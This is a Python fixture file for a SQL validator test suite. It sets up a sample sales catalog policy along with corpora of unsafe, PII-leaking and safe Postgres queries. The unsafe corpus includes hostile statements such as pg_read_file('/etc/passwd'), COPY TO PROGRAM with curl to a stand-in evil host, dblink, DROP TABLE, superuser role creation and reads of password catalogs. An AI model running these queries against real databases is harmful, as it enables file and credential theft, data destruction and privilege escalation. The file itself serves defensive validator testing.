"""Shared fixtures for the SQL validator suites: one catalog policy and both corpora."""

from __future__ import annotations

import uuid

from query_gateway.domain.policies.sql_validator import RejectionReason as R
from query_gateway.domain.value_objects.policy import ColumnPolicy, DataSourcePolicy, TablePolicy


def _table(
    schema: str, name: str, *columns: str, pii: tuple[str, ...] = (), visible: bool = True
) -> TablePolicy:
    return TablePolicy(
        schema_name=schema,
        table_name=name,
        columns=tuple(ColumnPolicy(c, "text", c in pii) for c in columns),
        is_visible_to_agent=visible,
    )


POLICY = DataSourcePolicy(
    data_source_id=uuid.uuid4(),
    tenant_id=uuid.uuid4(),
    engine="postgres",
    database_name="sample_sales",
    allowed_schemas=("sales",),
    status="active",
    secret_ref="secret/data/tenants/t/datasources/d",
    tables=(
        _table("sales", "orders", "id", "customer_id", "order_date", "status", "amount", "data"),
        _table("sales", "customers", "id", "name", "email", "region_id", pii=("email",)),
        _table("sales", "regions", "id", "name"),
        _table(
            "sales", "order_items", "order_id", "line_no", "product_id", "quantity", "unit_price"
        ),
        _table("sales", "internal_notes", "id", "note", visible=False),
        # Catalogued but outside allowed_schemas: must be unreachable.
        _table("private", "salaries", "id", "amount"),
    ),
)

#: A second policy where one table name exists in two allowed schemas.
AMBIGUOUS_POLICY = DataSourcePolicy(
    data_source_id=uuid.uuid4(),
    tenant_id=uuid.uuid4(),
    engine="postgres",
    database_name="sample_sales",
    allowed_schemas=("sales", "finance"),
    status="active",
    secret_ref="secret/data/tenants/t/datasources/d",
    tables=(_table("sales", "orders", "id"), _table("finance", "orders", "id")),
)

#: The Section 25 unsafe-SQL corpus: (name, sql, expected reason). Every entry must be
#: rejected for every purpose. Grouped by the Section 13 rule it attacks.
UNSAFE: list[tuple[str, str, R]] = [
    # --- DDL --------------------------------------------------------------------------------
    ("create_table", "CREATE TABLE sales.x (id int)", R.WRITE_OPERATION),
    ("create_table_as", "CREATE TABLE sales.x AS SELECT * FROM sales.orders", R.WRITE_OPERATION),
    ("create_temp_table_as", "CREATE TEMP TABLE t AS SELECT 1", R.WRITE_OPERATION),
    ("create_view", "CREATE VIEW sales.v AS SELECT id FROM sales.orders", R.WRITE_OPERATION),
    (
        "create_function",
        "CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql",
        R.WRITE_OPERATION,
    ),
    ("create_extension", "CREATE EXTENSION dblink", R.WRITE_OPERATION),
    ("create_role", "CREATE ROLE attacker SUPERUSER", R.WRITE_OPERATION),
    ("drop_table", "DROP TABLE sales.orders", R.WRITE_OPERATION),
    ("drop_schema_cascade", "DROP SCHEMA sales CASCADE", R.WRITE_OPERATION),
    ("alter_table", "ALTER TABLE sales.orders ADD COLUMN x int", R.WRITE_OPERATION),
    ("alter_role", "ALTER ROLE sales_reader SUPERUSER", R.WRITE_OPERATION),
    ("alter_system", "ALTER SYSTEM SET log_statement = 'none'", R.WRITE_OPERATION),
    ("truncate", "TRUNCATE sales.orders", R.WRITE_OPERATION),
    ("grant", "GRANT ALL ON sales.orders TO PUBLIC", R.WRITE_OPERATION),
    ("revoke", "REVOKE SELECT ON sales.orders FROM PUBLIC", R.WRITE_OPERATION),
    ("comment_on", "COMMENT ON TABLE sales.orders IS 'x'", R.WRITE_OPERATION),
    ("refresh_matview", "REFRESH MATERIALIZED VIEW sales.monthly", R.WRITE_OPERATION),
    ("vacuum", "VACUUM FULL sales.orders", R.WRITE_OPERATION),
    ("analyze", "ANALYZE sales.orders", R.WRITE_OPERATION),
    ("reindex", "REINDEX TABLE sales.orders", R.WRITE_OPERATION),
    ("cluster", "CLUSTER sales.orders", R.PARSE_ERROR),
    # --- DML --------------------------------------------------------------------------------
    ("insert", "INSERT INTO sales.orders (id) VALUES (1)", R.WRITE_OPERATION),
    ("insert_select", "INSERT INTO sales.orders SELECT * FROM sales.orders", R.WRITE_OPERATION),
    (
        "upsert",
        "INSERT INTO sales.orders (id) VALUES (1) ON CONFLICT DO NOTHING",
        R.WRITE_OPERATION,
    ),
    ("update", "UPDATE sales.orders SET amount = 0", R.WRITE_OPERATION),
    (
        "update_from",
        "UPDATE sales.orders o SET amount = 0 FROM sales.customers c WHERE c.id = o.customer_id",
        R.WRITE_OPERATION,
    ),
    ("delete", "DELETE FROM sales.orders", R.WRITE_OPERATION),
    ("delete_using", "DELETE FROM sales.orders USING sales.customers", R.WRITE_OPERATION),
    (
        "merge",
        "MERGE INTO sales.orders o USING sales.customers c ON o.id = c.id WHEN MATCHED THEN DELETE",
        R.WRITE_OPERATION,
    ),
    (
        "cte_delete",
        "WITH d AS (DELETE FROM sales.orders RETURNING id) SELECT * FROM d",
        R.WRITE_OPERATION,
    ),
    (
        "cte_update",
        "WITH u AS (UPDATE sales.orders SET amount = 0 RETURNING *) SELECT 1",
        R.WRITE_OPERATION,
    ),
    (
        "cte_insert",
        "WITH i AS (INSERT INTO sales.orders (id) VALUES (9) RETURNING id) SELECT id FROM i",
        R.WRITE_OPERATION,
    ),
    (
        "nested_cte_delete",
        "WITH a AS (SELECT 1), b AS (DELETE FROM sales.orders RETURNING id) SELECT * FROM a",
        R.WRITE_OPERATION,
    ),
    ("select_into", "SELECT * INTO sales.copy FROM sales.orders", R.INTO_CLAUSE),
    ("select_into_temp", "SELECT * INTO TEMP t FROM sales.orders", R.INTO_CLAUSE),
    ("for_update", "SELECT * FROM sales.orders FOR UPDATE", R.LOCKING_CLAUSE),
    ("for_share", "SELECT id FROM sales.orders FOR SHARE", R.LOCKING_CLAUSE),
    (
        "for_update_skip_locked",
        "SELECT id FROM sales.orders FOR UPDATE SKIP LOCKED",
        R.LOCKING_CLAUSE,
    ),
    ("for_no_key_update", "SELECT id FROM sales.orders FOR NO KEY UPDATE", R.LOCKING_CLAUSE),
    # --- Multiple statements and smuggling --------------------------------------------------
    ("two_selects", "SELECT 1; SELECT 2", R.MULTIPLE_STATEMENTS),
    (
        "select_then_drop",
        "SELECT id FROM sales.orders; DROP TABLE sales.orders",
        R.MULTIPLE_STATEMENTS,
    ),
    ("no_space_chain", "SELECT 1;DELETE FROM sales.orders", R.MULTIPLE_STATEMENTS),
    (
        "block_comment_chain",
        "SELECT 1 /* innocent */; DROP TABLE sales.orders",
        R.MULTIPLE_STATEMENTS,
    ),
    ("line_comment_chain", "SELECT 1 --\n; DROP TABLE sales.orders", R.MULTIPLE_STATEMENTS),
    ("union_into_drop", "SELECT 1 UNION SELECT 2; DROP TABLE sales.orders", R.MULTIPLE_STATEMENTS),
    ("select_then_copy", "SELECT 1; COPY sales.orders TO '/tmp/o.csv'", R.MULTIPLE_STATEMENTS),
    # --- Session, transaction and procedural commands ----------------------------------------
    ("do_block", "DO $$ BEGIN PERFORM pg_sleep(10); END $$", R.WRITE_OPERATION),
    ("call_procedure", "CALL sales.purge()", R.WRITE_OPERATION),
    ("explain_analyze_delete", "EXPLAIN ANALYZE DELETE FROM sales.orders", R.WRITE_OPERATION),
    ("explain", "EXPLAIN SELECT * FROM sales.orders", R.WRITE_OPERATION),
    ("prepare", "PREPARE p AS DELETE FROM sales.orders", R.WRITE_OPERATION),
    ("execute", "EXECUTE p", R.WRITE_OPERATION),
    ("deallocate", "DEALLOCATE ALL", R.NOT_A_SELECT),
    ("set_role", "SET ROLE postgres", R.WRITE_OPERATION),
    ("set_search_path", "SET search_path = public", R.WRITE_OPERATION),
    ("set_session_authorization", "SET SESSION AUTHORIZATION postgres", R.WRITE_OPERATION),
    ("set_read_write", "SET TRANSACTION READ WRITE", R.WRITE_OPERATION),
    ("reset_all", "RESET ALL", R.WRITE_OPERATION),
    ("show_all", "SHOW ALL", R.WRITE_OPERATION),
    ("begin", "BEGIN", R.WRITE_OPERATION),
    ("commit", "COMMIT", R.WRITE_OPERATION),
    ("rollback", "ROLLBACK", R.WRITE_OPERATION),
    ("savepoint", "SAVEPOINT s", R.NOT_A_SELECT),
    ("listen", "LISTEN channel", R.NOT_A_SELECT),
    ("notify", "NOTIFY channel", R.NOT_A_SELECT),
    ("declare_cursor", "DECLARE c CURSOR FOR SELECT * FROM sales.orders", R.WRITE_OPERATION),
    ("fetch_cursor", "FETCH ALL FROM c", R.WRITE_OPERATION),
    ("lock_table", "LOCK TABLE sales.orders IN ACCESS EXCLUSIVE MODE", R.WRITE_OPERATION),
    ("load_library", "LOAD 'plpython3u'", R.WRITE_OPERATION),
    ("checkpoint", "CHECKPOINT", R.NOT_A_SELECT),
    ("discard", "DISCARD ALL", R.NOT_A_SELECT),
    ("copy_to_file", "COPY sales.orders TO '/tmp/orders.csv'", R.WRITE_OPERATION),
    ("copy_to_program", "COPY (SELECT 1) TO PROGRAM 'curl http://evil.example'", R.WRITE_OPERATION),
    ("copy_from_file", "COPY sales.orders FROM '/etc/passwd'", R.WRITE_OPERATION),
    # --- File, network, administrative and blocking functions ---------------------------------
    ("pg_read_file", "SELECT pg_read_file('/etc/passwd')", R.FUNCTION_NOT_ALLOWED),
    ("pg_read_binary_file", "SELECT pg_read_binary_file('/etc/passwd')", R.FUNCTION_NOT_ALLOWED),
    ("pg_ls_dir_select", "SELECT pg_ls_dir('.')", R.FUNCTION_NOT_ALLOWED),
    ("pg_stat_file", "SELECT pg_stat_file('postgresql.conf')", R.FUNCTION_NOT_ALLOWED),
    ("lo_import", "SELECT lo_import('/etc/passwd')", R.FUNCTION_NOT_ALLOWED),
    ("lo_export", "SELECT lo_export(1, '/tmp/x')", R.FUNCTION_NOT_ALLOWED),
    ("lo_get", "SELECT lo_get(1)", R.FUNCTION_NOT_ALLOWED),
    (
        "dblink",
        "SELECT * FROM sales.orders WHERE id IN (SELECT dblink('host=evil', 'select 1'))",
        R.FUNCTION_NOT_ALLOWED,
    ),
    ("dblink_exec", "SELECT dblink_exec('dbname=x', 'DROP TABLE t')", R.FUNCTION_NOT_ALLOWED),
    ("pg_sleep", "SELECT pg_sleep(60)", R.FUNCTION_NOT_ALLOWED),
    (
        "pg_sleep_in_order_by",
        "SELECT id FROM sales.orders ORDER BY pg_sleep(1)",
        R.FUNCTION_NOT_ALLOWED,
    ),
    ("pg_sleep_in_subquery", "SELECT (SELECT pg_sleep(10))", R.FUNCTION_NOT_ALLOWED),
    ("pg_sleep_for", "SELECT pg_sleep_for('1 minute')", R.FUNCTION_NOT_ALLOWED),
    ("pg_terminate_backend", "SELECT pg_terminate_backend(1)", R.FUNCTION_NOT_ALLOWED),
    ("pg_cancel_backend", "SELECT pg_cancel_backend(1)", R.FUNCTION_NOT_ALLOWED),
    ("pg_reload_conf", "SELECT pg_reload_conf()", R.FUNCTION_NOT_ALLOWED),
    ("set_config_role", "SELECT set_config('role', 'postgres', false)", R.FUNCTION_NOT_ALLOWED),
    ("current_setting", "SELECT current_setting('data_directory')", R.FUNCTION_NOT_ALLOWED),
    ("advisory_lock", "SELECT pg_advisory_lock(1)", R.FUNCTION_NOT_ALLOWED),
    ("nextval", "SELECT nextval('sales.orders_id_seq')", R.FUNCTION_NOT_ALLOWED),
    ("setval", "SELECT setval('sales.orders_id_seq', 1)", R.FUNCTION_NOT_ALLOWED),
    ("txid_current", "SELECT txid_current()", R.FUNCTION_NOT_ALLOWED),
    (
        "query_to_xml",
        "SELECT query_to_xml('DELETE FROM sales.orders RETURNING 1', true, true, '')",
        R.FUNCTION_NOT_ALLOWED,
    ),
    ("table_to_xml", "SELECT table_to_xml('pg_authid', true, true, '')", R.FUNCTION_NOT_ALLOWED),
    ("pg_notify", "SELECT pg_notify('c', 'x')", R.FUNCTION_NOT_ALLOWED),
    ("inet_server_addr", "SELECT inet_server_addr()", R.FUNCTION_NOT_ALLOWED),
    ("version", "SELECT version()", R.FUNCTION_NOT_ALLOWED),
    ("current_user", "SELECT current_user", R.FUNCTION_NOT_ALLOWED),
    ("session_user", "SELECT session_user", R.FUNCTION_NOT_ALLOWED),
    (
        "union_file_read",
        "SELECT name FROM sales.regions UNION SELECT pg_read_file('/etc/passwd')",
        R.FUNCTION_NOT_ALLOWED,
    ),
    (
        "function_in_where",
        "SELECT id FROM sales.orders WHERE pg_read_file('/etc/passwd') IS NOT NULL",
        R.FUNCTION_NOT_ALLOWED,
    ),
    (
        "function_in_cte",
        "WITH x AS (SELECT pg_ls_dir('.') AS f) SELECT f FROM x",
        R.FUNCTION_NOT_ALLOWED,
    ),
    ("quoted_function_name", "SELECT \"pg_read_file\"('/etc/passwd')", R.FUNCTION_NOT_ALLOWED),
    (
        "qualified_system_function",
        "SELECT pg_catalog.pg_read_file('/etc/passwd')",
        R.QUALIFIED_FUNCTION,
    ),
    (
        "qualified_shadow_builtin",
        "SELECT sales.lower(name) FROM sales.regions",
        R.QUALIFIED_FUNCTION,
    ),
    (
        "generate_series_dos",
        "SELECT count(*) FROM generate_series(1, 10000000000)",
        R.FUNCTION_NOT_ALLOWED,
    ),
    ("table_function_in_from", "SELECT * FROM pg_ls_dir('.')", R.FUNCTION_NOT_ALLOWED),
    ("allowed_function_as_table", "SELECT * FROM lower('x')", R.TABLE_FUNCTION),
    ("rows_from", "SELECT * FROM ROWS FROM (generate_series(1, 2))", R.FUNCTION_NOT_ALLOWED),
    # --- Catalog probing and unlisted objects --------------------------------------------------
    ("pg_shadow", "SELECT * FROM pg_catalog.pg_shadow", R.TABLE_NOT_ALLOWED),
    ("pg_authid", "SELECT rolpassword FROM pg_authid", R.TABLE_NOT_ALLOWED),
    ("pg_class", "SELECT relname FROM pg_catalog.pg_class", R.TABLE_NOT_ALLOWED),
    ("information_schema", "SELECT table_name FROM information_schema.tables", R.TABLE_NOT_ALLOWED),
    ("pg_stat_activity", "SELECT query FROM pg_stat_activity", R.TABLE_NOT_ALLOWED),
    ("uncatalogued_table", "SELECT * FROM sales.hidden_costs", R.TABLE_NOT_ALLOWED),
    ("schema_outside_allow_list", "SELECT * FROM private.salaries", R.TABLE_NOT_ALLOWED),
    ("cross_database", "SELECT * FROM other_db.sales.orders", R.TABLE_NOT_ALLOWED),
    (
        "uncatalogued_in_subquery",
        "SELECT id FROM sales.orders WHERE id IN (SELECT id FROM public.secrets)",
        R.TABLE_NOT_ALLOWED,
    ),
    (
        "uncatalogued_in_cte",
        "WITH s AS (SELECT * FROM pg_user) SELECT * FROM s",
        R.TABLE_NOT_ALLOWED,
    ),
    (
        "uncatalogued_in_join",
        "SELECT o.id FROM sales.orders o JOIN pg_roles r ON true",
        R.TABLE_NOT_ALLOWED,
    ),
    ("regclass_cast", "SELECT 'pg_authid'::regclass", R.CAST_NOT_ALLOWED),
    ("regproc_cast", "SELECT 'pg_read_file'::regproc", R.CAST_NOT_ALLOWED),
    ("regclass_cast_function_style", "SELECT CAST('pg_shadow' AS regclass)", R.CAST_NOT_ALLOWED),
    ("unknown_column", "SELECT password FROM sales.customers", R.COLUMN_NOT_ALLOWED),
    (
        "unknown_column_in_where",
        "SELECT id FROM sales.orders WHERE secret_flag = 1",
        R.COLUMN_NOT_ALLOWED,
    ),
    # --- Parameters, garbage, resource limits ----------------------------------------------------
    ("dollar_parameter", "SELECT * FROM sales.orders WHERE id = $1", R.PARAMETER),
    ("named_parameter", "SELECT * FROM sales.orders WHERE id = :id", R.PARAMETER),
    ("question_parameter", "SELECT * FROM sales.orders WHERE id = ?", R.PARAMETER),
    ("empty", "", R.EMPTY),
    ("whitespace", "   \n\t ", R.EMPTY),
    ("only_semicolon", ";", R.EMPTY),
    ("null_byte", "SELECT 1\x00; DROP TABLE sales.orders", R.INVALID_CHARACTERS),
    ("garbage", "SELEC id FRM sales.orders", R.PARSE_ERROR),
    ("unterminated_string", "SELECT 'abc FROM sales.orders", R.PARSE_ERROR),
    ("table_statement", "TABLE sales.orders", R.PARSE_ERROR),
    ("too_long", "SELECT " + ", ".join(["1"] * 30_000), R.TOO_LONG),
]

#: Rejected only on the agent path (`analytics_run`): Section 12 PII and visibility policy.
AGENT_ONLY_UNSAFE: list[tuple[str, str, R]] = [
    ("pii_column", "SELECT email FROM sales.customers", R.PII_COLUMN),
    ("pii_via_star", "SELECT * FROM sales.customers", R.PII_COLUMN),
    ("pii_in_where", "SELECT id FROM sales.customers WHERE email LIKE '%@x.com'", R.PII_COLUMN),
    (
        "pii_in_cte",
        "WITH c AS (SELECT email FROM sales.customers) SELECT count(*) FROM c",
        R.PII_COLUMN,
    ),
    (
        "pii_in_join_condition",
        "SELECT o.id FROM sales.orders o JOIN sales.customers c ON c.email = o.status",
        R.PII_COLUMN,
    ),
    (
        "pii_in_subquery",
        "SELECT id FROM sales.orders WHERE status IN (SELECT email FROM sales.customers)",
        R.PII_COLUMN,
    ),
    ("pii_aliased", "SELECT c.email AS contact FROM sales.customers c", R.PII_COLUMN),
    ("pii_in_aggregate", "SELECT count(DISTINCT email) FROM sales.customers", R.PII_COLUMN),
    ("invisible_table", "SELECT note FROM sales.internal_notes", R.TABLE_NOT_ALLOWED),
]

#: Analytics a legitimate caller writes. Must pass for both purposes (no PII, visible tables).
SAFE: list[tuple[str, str]] = [
    ("simple", "SELECT id, amount FROM sales.orders"),
    ("unqualified_table", "SELECT id FROM orders WHERE amount > 10"),
    ("mixed_case_unquoted", "SELECT ID, Amount FROM Sales.Orders"),
    ("trailing_semicolon", "SELECT id FROM sales.orders;"),
    ("comments_stripped", "SELECT id /* note */ FROM sales.orders -- trailing"),
    (
        "aggregate_group",
        "SELECT status, count(*), sum(amount), avg(amount) FROM sales.orders GROUP BY status HAVING sum(amount) > 0 ORDER BY 2 DESC LIMIT 10",
    ),
    (
        "date_trunc_monthly",
        "SELECT date_trunc('month', order_date) AS month, sum(amount) AS revenue FROM sales.orders GROUP BY 1 ORDER BY 1",
    ),
    (
        "join_regions",
        "SELECT r.name, sum(o.amount) FROM sales.orders o JOIN sales.customers c ON c.id = o.customer_id JOIN sales.regions r ON r.id = c.region_id GROUP BY r.name",
    ),
    (
        "cte",
        "WITH q2 AS (SELECT * FROM sales.orders WHERE order_date >= DATE '2026-04-01' AND order_date < DATE '2026-07-01') SELECT count(*) FROM q2",
    ),
    (
        "window",
        "SELECT id, rank() OVER (PARTITION BY customer_id ORDER BY amount DESC), lag(amount) OVER (ORDER BY order_date) FROM sales.orders",
    ),
    ("union_all", "SELECT id FROM sales.orders UNION ALL SELECT id FROM sales.regions"),
    ("subquery_in_from", "SELECT t.n FROM (SELECT count(*) AS n FROM sales.orders) t"),
    (
        "exists_subquery",
        "SELECT c.id FROM sales.customers c WHERE EXISTS (SELECT 1 FROM sales.orders o WHERE o.customer_id = c.id)",
    ),
    (
        "case_coalesce_cast",
        "SELECT CASE WHEN amount > 100 THEN 'big' ELSE 'small' END, coalesce(amount, 0), amount::int, CAST(amount AS text) FROM sales.orders",
    ),
    (
        "string_functions",
        "SELECT upper(name), length(name), substring(name FROM 1 FOR 3), concat(name, '!'), replace(name, 'a', 'b') FROM sales.regions",
    ),
    (
        "extract_and_to_char",
        "SELECT extract(year FROM order_date), to_char(order_date, 'YYYY-MM'), age(order_date) FROM sales.orders",
    ),
    ("percentile", "SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY amount) FROM sales.orders"),
    ("filter_clause", "SELECT count(*) FILTER (WHERE status = 'refunded') FROM sales.orders"),
    ("values_literal", "SELECT v.a FROM (VALUES (1), (2)) AS v(a)"),
    (
        "recursive_cte",
        "WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM t WHERE n < 5) SELECT n FROM t",
    ),
    ("json_accessor", "SELECT data ->> 'channel' FROM sales.orders"),
    (
        "like_between_in",
        "SELECT id FROM sales.orders WHERE status LIKE 'c%' AND amount BETWEEN 1 AND 10 AND id IN (1, 2, 3)",
    ),
    (
        "dollar_quoted_literal",
        "SELECT $tag$x; DROP TABLE sales.orders$tag$ AS s FROM sales.regions",
    ),
    ("customers_without_pii", "SELECT id, name, region_id FROM sales.customers"),
    ("count_star_customers", "SELECT count(*) FROM sales.customers"),
    ("cte_named_like_table", "WITH orders AS (SELECT 1 AS id) SELECT id FROM orders"),
]
